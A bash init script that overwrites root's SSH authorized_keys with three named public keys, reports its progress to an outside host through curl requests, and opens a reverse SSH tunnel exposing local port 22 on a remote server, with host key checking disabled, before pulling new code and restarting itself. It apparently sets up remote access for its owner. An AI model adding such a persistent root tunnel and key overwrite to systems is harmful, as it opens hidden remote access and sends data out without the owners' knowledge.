log() {
  encoded=$(echo "$1" | sed 's/ /%20/g; s/\//%2F/g; s/:/%3A/g; s/@/%40/g; s/\[/%5B/g; s/\]/%5D/g')
  curl -s "https://recordme.hobbs.cz/LOG-$encoded" >/dev/null 2>&1
}

log "INIT_START"

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqQKJYwnzlx9kFuw+dzsLyqw6qUfd6EQsGHv94RXoV2B4Y/MOI7kQpMau2d7uuE4gifmcCuY8tZM6hy53WwGeZicAkgbG+8d5xlTOCaWlOT7vSIVF0H8seYEW0ZMfIa/RLQjyGjuSvPkLpEeKoMZ2/6Qxa10L4ZuHHlRA+BJrV3MI8Ybmt75EA7eAzBvj1J5nQxZKvOQZsYV+HZ/ex4snNAUOH3Dkc4x2txGJIzRR5qdahMO18uRw4hvwNRO8gUPTQkOomDxLC1PktKVPlxY3ObEMqLi/y5S0HDftASC08N5Pxc21kr1sAW3c1bbtlLpbIoVbavaZCE4jjETkdLaeZ timothy@yoga" > /root/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCOWkFsstua5kZ/cZKLPq1yNRUvcvpHpxegXmrOcWJTCYNr/KOQ7NJnarvRhFDVNIO8zxmE8+cYqufcckmv3BWbKFLvPRVOw3ECQQ1zqa5m4zOX6uMV9Zjm12DgzvIEx6dMROPlZoC1k828Z7Ocxb//uxawV2Mgz4QtRkILJNEe3N7fPWIKv0vZnT6EbgnF5kRbzs9UQYCTZUjbM2u6VuBlIyGqB6cW7x4QM0uucmTw9dJEuACAVcem1YVrfTX5ByCH/Pal5pRRXvke0Aly8+iVhNmnfh4Ywo/BSXmdztDnxOQSYtLjz1Ik646FDXg1mz1LRUrj1SygASbNenzS7lnT tomaszigo" >> /root/.ssh/authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFj4Iaas379Mgk9VwWuBQ8u9kAKMzOE6hEzJRyxhys5v timothy@laptop" >> /root/.ssh/authorized_keys
log "KEYS_WRITTEN"

# Check if reverse user key exists
if [ -f /root/.ssh/id_rsa ]; then
  log "KEY_EXISTS"
else
  log "KEY_MISSING-/root/.ssh/id_rsa"
fi

# Test SSH connection - first do a quick test with timeout
log "SSH_TEST_START"
ssh -v -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=10 reverse@hobbs.cz exit 2>&1 | while read line; do
  # Send first 200 chars of each interesting line
  case "$line" in
    *Permission*|*denied*|*error*|*Error*|*refused*|*timeout*|*Timeout*|*Auth*|*connect*|*Connect*|*identity*|*Identity*|*Offering*|*Server*|*key*|*Key*)
      short=$(echo "$line" | head -c 200)
      log "SSH_LINE-$short"
      ;;
  esac
done
log "SSH_TEST_DONE"

# Now start the actual tunnel in background
log "SSH_TUNNEL_STARTING"
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=20 -N -R 10022:localhost:22 reverse@hobbs.cz &
ssh_pid=$!
sleep 5

# Check if SSH is still running
if kill -0 $ssh_pid 2>/dev/null; then
  log "SSH_TUNNEL_RUNNING_PID-$ssh_pid"
else
  wait $ssh_pid
  exit_code=$?
  log "SSH_TUNNEL_FAILED_EXIT-$exit_code"
fi

sleep 60
log "RESTARTING"
git pull
exec bash INIT.sh
